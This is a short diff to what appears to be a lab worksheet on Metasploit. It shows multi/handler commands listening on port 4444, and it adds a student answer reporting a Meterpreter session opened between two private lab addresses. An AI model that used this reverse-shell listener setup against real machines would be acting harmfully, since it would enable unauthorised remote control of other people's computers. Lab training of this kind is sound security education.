@@ -153,7 +153,9 @@ msf exploit(multi/handler) > set LPORT 4444
 LPORT => 4444
 msf exploit(multi/handler) > run
 
-- What session did you receive back? - 
+- What session did you receive back?
+   [*] Meterpreter session 1 opened (192.168.0.201:4444 -> 192.168.0.73:59242) at 2025-09-09 19:43:28 +0800
+
 - Paste a sample output (e.g. `meterpreter >`)
 
 ---
